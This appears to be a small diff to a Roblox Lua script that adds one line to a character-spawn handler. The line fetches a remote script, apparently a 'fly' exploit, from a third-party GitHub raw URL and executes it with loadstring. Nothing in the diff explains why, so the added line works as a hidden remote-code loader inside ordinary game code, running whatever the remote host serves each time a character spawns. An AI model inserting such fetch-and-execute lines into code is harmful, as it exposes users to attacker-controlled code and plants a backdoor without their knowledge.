@@ -103,6 +103,6 @@ local character = nil
 
 Player.CharacterAdded:Connect(function(newCharacter)
 wait(3)
-    
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxindonesiagithub30/-Robloxindonesia30scriptbase-/Robloxindoneska30/Robloxfly.lua",true))()
     character = newCharacter
 end
